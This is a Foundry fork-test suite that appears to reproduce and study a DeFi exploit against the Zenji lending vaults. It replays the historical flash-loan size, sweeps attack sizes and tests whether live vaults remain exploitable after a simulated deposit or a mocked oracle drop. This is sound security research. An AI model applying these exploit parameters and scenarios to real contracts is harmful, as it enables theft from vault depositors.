// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import { Test } from "forge-std/Test.sol";
import { ZenjiAttacker } from "../src/ZenjiAttacker.sol";

interface IVault {
    function rebalance() external;
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function asset() external view returns (address);
    function depositsPaused() external view returns (bool);
    function emergencyMode() external view returns (bool);
    function strategyToDebtRatio() external view returns (uint256);
    function loanManager() external view returns (address);
}

interface ILoanManager {
    function loanExists() external view returns (bool);
    function getCurrentLTV() external view returns (uint256);
    function getCurrentDebt() external view returns (uint256);
}

interface IAggregator {
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80);
}

interface IERC20Like {
    function approve(address, uint256) external;
    function balanceOf(address) external view returns (uint256);
    function decimals() external view returns (uint8);
}

/// @notice Fork verification of the Zenji "permissionless rebalance at a self-referential mark"
///         recipe (Ethereum, exploited 2026-11-08). Read-only: local anvil forks only.
///
///         Each scenario runs in its OWN test with exactly one fork. Foundry's snapshot /
///         multi-createSelectFork resets inside a single test produced cross-fork state
///         corruption in early iterations of this suite (pool transferFrom reverting on state
///         that works in a clean fork), so the suite is deliberately one-fork-per-test.
contract ZenjiSiblingsTest is Test {
    address constant WSTETH_VAULT = 0x23F189dE34EED95f6303CfF1C77f7676F211Dd2c;
    address constant WBTC_VAULT = 0x18E2F4F2E6565187fce73ECC707579E5F7933f74;
    address constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant WSTETH_LM = 0xCf9f54218666a32BE9da1d60BC81412BA86730C7;
    address constant WSTETH_USD_ORACLE = 0xDC88A9052F1352094C749b04627Fe04551e689eC;

    /// @dev The real exploit tx (0x79fa5b30...) created its executor in block 26371413.
    uint256 constant HIST_BLOCK = 26_371_412;
    /// @dev Exact USDT pulled from Morpho in the real exploit (calldata 0x6951c9dd700).
    uint256 constant HIST_USDT = 7_237_500_000_000;
    /// @dev Live-state block pinned for reproducibility (archive needed).
    uint256 constant LIVE_BLOCK = 26_381_000;

    function _histRpc() internal view returns (string memory) {
        return vm.envOr("HIST_RPC", vm.envOr("BLOCKPI_RPC_URL", string("https://eth.drpc.org")));
    }

    function _liveRpc() internal view returns (string memory) {
        return vm.envOr(
            "LIVE_RPC",
            vm.envOr("BLOCKPI_RPC_URL", string("https://eth.blockpi.network/v1/rpc/public"))
        );
    }

    function _newAttacker(bool poke) internal returns (ZenjiAttacker a) {
        a = new ZenjiAttacker(WSTETH_VAULT, WBTC_VAULT);
        a.setDoRebalance(poke);
    }

    function _seedAndAttack(ZenjiAttacker a, uint256 size, uint256 seed)
        internal
        returns (bool ok, uint256 profit)
    {
        if (seed > 0) deal(USDT, address(a), seed);
        try a.attack(size) {
            ok = true;
            profit = a.profit();
        } catch {
            ok = false;
            profit = 0;
        }
    }

    // ------------------------------------------------------------------ A. historical repro

    /// @notice Replays the 2026-11-08 recipe at the block before the exploit. An independent
    ///         implementation reproduces the real attacker's 4,951.40 USDT net.
    function test_A_historical_repro() public {
        vm.createSelectFork(_histRpc(), HIST_BLOCK);

        uint256 vA0 = IVault(WSTETH_VAULT).totalAssets();
        uint256 vB0 = IVault(WBTC_VAULT).totalAssets();

        ZenjiAttacker a = _newAttacker(true);
        a.attack(HIST_USDT);

        emit log_named_int("attacker_pnl_usdt_1e6", a.pnl() / 1e6);
        emit log_named_uint("attacker_profit_usdt_1e6", a.profit());
        emit log_named_uint("crv_bought_1e18", a.crvBought());
        emit log_named_uint("crv_sold_1e18", a.crvSold());
        emit log_named_uint("rebalanceA_ok", a.rebalanceAOk() ? 1 : 0);
        emit log_named_uint("rebalanceB_ok", a.rebalanceBOk() ? 1 : 0);
        emit log_named_uint("vaultA_totalAssets_before", vA0);
        emit log_named_uint("vaultA_totalAssets_after", IVault(WSTETH_VAULT).totalAssets());
        emit log_named_uint("vaultB_totalAssets_before", vB0);
        emit log_named_uint("vaultB_totalAssets_after", IVault(WBTC_VAULT).totalAssets());

        assertTrue(a.rebalanceAOk() && a.rebalanceBOk(), "rebalance not executed");
        // Real net was 4,951,395,691 (4,951.40 USDT). Allow a band for state drift.
        assertGt(a.profit(), 4_000e6, "did not reproduce the historical net");
    }

    // ------------------------------------------------------------------ B. historical size sweep

    function test_B_1M() public {
        _historicalSize(1_000_000e6);
    }

    function test_B_2M5() public {
        _historicalSize(2_500_000e6);
    }

    function test_B_5M() public {
        _historicalSize(5_000_000e6);
    }

    function test_B_7M24() public {
        _historicalSize(7_237_500e6);
    }

    function test_B_10M() public {
        _historicalSize(10_000_000e6);
    }

    function test_B_14M() public {
        _historicalSize(14_000_000e6);
    }

    function _historicalSize(uint256 size) internal {
        vm.createSelectFork(_histRpc(), HIST_BLOCK);
        ZenjiAttacker a = _newAttacker(true);
        (bool ok, uint256 p) = _seedAndAttack(a, size, 200_000e6);
        emit log_named_uint("size_usdt_1e6", size / 1e6);
        emit log_named_uint("ok", ok ? 1 : 0);
        emit log_named_int("pnl_usdt_1e6", a.pnl() / 1e6);
        emit log_named_uint("profit_usdt_1e6", p / 1e6);
    }

    // ------------------------------------------------------------------ C. live state today

    /// @notice Today both vaults have no loan, so rebalance() reverts RebalanceNotNeeded and a
    ///         round trip cannot repay the flash loan.
    function test_C_live_no_fuel() public {
        vm.createSelectFork(_liveRpc(), LIVE_BLOCK);
        uint256 blk = block.number;

        (bool ok, bytes memory ret) = WSTETH_VAULT.call(abi.encodeWithSignature("rebalance()"));

        ZenjiAttacker a = _newAttacker(true);
        (bool ok2,) = _seedAndAttack(a, 1_000_000e6, 0);

        emit log_named_uint("fork_block", blk);
        emit log_named_uint("direct_rebalance_ok", ok ? 1 : 0);
        emit log_named_bytes("direct_rebalance_revert", ret);
        emit log_named_uint("attack_ok", ok2 ? 1 : 0);
        emit log_named_uint("vaultA_totalAssets", IVault(WSTETH_VAULT).totalAssets());
        emit log_named_uint("vaultB_totalAssets", IVault(WBTC_VAULT).totalAssets());
        emit log_named_uint("vaultA_depositsPaused", IVault(WSTETH_VAULT).depositsPaused() ? 1 : 0);
        emit log_named_uint("vaultA_emergencyMode", IVault(WSTETH_VAULT).emergencyMode() ? 1 : 0);
        emit log_named_uint("loanExists", ILoanManager(WSTETH_LM).loanExists() ? 1 : 0);
        emit log_named_uint("debt", ILoanManager(WSTETH_LM).getCurrentDebt());

        assertFalse(ok, "rebalance unexpectedly succeeded on a loanless vault");
        assertFalse(ok2, "attack unexpectedly succeeded");
    }

    // ------------------------------------------------------------------ D. latent: healthy vault

    function test_D_healthy_7M8() public {
        _healthy(7_800_000e6);
    }

    function test_D_healthy_8M0() public {
        _healthy(8_000_000e6);
    }

    function test_D_healthy_8M2() public {
        _healthy(8_200_000e6);
    }

    function test_D_healthy_8M8() public {
        _healthy(8_800_000e6);
    }

    /// @dev Simulated third-party deposit of 100 wstETH into the live vault at target LTV (65%),
    ///      then the recipe with no oracle move. Latent only: today the vault holds dust.
    function _healthy(uint256 size) internal {
        vm.createSelectFork(_liveRpc(), LIVE_BLOCK);
        address whale = address(0xBEEF);
        deal(WSTETH, whale, 100e18);
        vm.startPrank(whale);
        IERC20Like(WSTETH).approve(WSTETH_VAULT, 100e18);
        uint256 shares = IVault(WSTETH_VAULT).deposit(100e18, whale);
        vm.stopPrank();
        vm.roll(block.number + 2);

        uint256 navBefore = IVault(WSTETH_VAULT).convertToAssets(shares);
        ZenjiAttacker a = _newAttacker(true);
        (bool ok, uint256 p) = _seedAndAttack(a, size, 200_000e6);
        uint256 navAfter = IVault(WSTETH_VAULT).convertToAssets(shares);

        emit log_named_uint("scenario", 0); // healthy
        emit log_named_uint("size_usdt_1e6", size / 1e6);
        emit log_named_uint("ok", ok ? 1 : 0);
        emit log_named_int("attacker_pnl_usdt_1e6", a.pnl() / 1e6);
        emit log_named_uint("shares", shares);
        emit log_named_uint("nav_before_1e18", navBefore);
        emit log_named_uint("nav_after_1e18", navAfter);
        emit log_named_uint("rebalanceA_ok", a.rebalanceAOk() ? 1 : 0);
        emit log_named_uint("ltv_after", ILoanManager(WSTETH_LM).getCurrentLTV());
    }

    // ------------------------------------------------------------------ E. latent: drawdown

    function test_E_drawdown_7M8() public {
        _drawdown(7_800_000e6);
    }

    function test_E_drawdown_8M0() public {
        _drawdown(8_000_000e6);
    }

    function test_E_drawdown_8M2() public {
        _drawdown(8_200_000e6);
    }

    function test_E_drawdown_8M8() public {
        _drawdown(8_800_000e6);
    }

    /// @dev Same as _healthy but the Chainlink wstETH/USD feed is mocked 10% lower, putting LTV at
    ///      ~72% (above the 68% upper deadband) so rebalance() is forced to deleverage. The mock
    ///      simulates a real market move; it is labelled a hypothetical in the report.
    function _drawdown(uint256 size) internal {
        vm.createSelectFork(_liveRpc(), LIVE_BLOCK);
        address whale = address(0xBEEF);
        deal(WSTETH, whale, 100e18);
        vm.startPrank(whale);
        IERC20Like(WSTETH).approve(WSTETH_VAULT, 100e18);
        uint256 shares = IVault(WSTETH_VAULT).deposit(100e18, whale);
        vm.stopPrank();

        (, int256 answer,,,) = IAggregator(WSTETH_USD_ORACLE).latestRoundData();
        vm.mockCall(
            WSTETH_USD_ORACLE,
            abi.encodeWithSignature("latestRoundData()"),
            abi.encode(uint80(1), (answer * 90) / 100, uint256(0), block.timestamp, uint80(1))
        );
        vm.roll(block.number + 2);

        uint256 navBefore = IVault(WSTETH_VAULT).convertToAssets(shares);
        uint256 ltvBefore = ILoanManager(WSTETH_LM).getCurrentLTV();
        ZenjiAttacker a = _newAttacker(true);
        (bool ok, uint256 p) = _seedAndAttack(a, size, 200_000e6);
        uint256 navAfter = IVault(WSTETH_VAULT).convertToAssets(shares);

        emit log_named_uint("scenario", 1); // drawdown
        emit log_named_uint("size_usdt_1e6", size / 1e6);
        emit log_named_uint("ok", ok ? 1 : 0);
        emit log_named_int("attacker_pnl_usdt_1e6", a.pnl() / 1e6);
        emit log_named_uint("shares", shares);
        emit log_named_uint("nav_before_1e18", navBefore);
        emit log_named_uint("nav_after_1e18", navAfter);
        emit log_named_uint("rebalanceA_ok", a.rebalanceAOk() ? 1 : 0);
        emit log_named_uint("ltv_after", ltvBefore);
    }
}
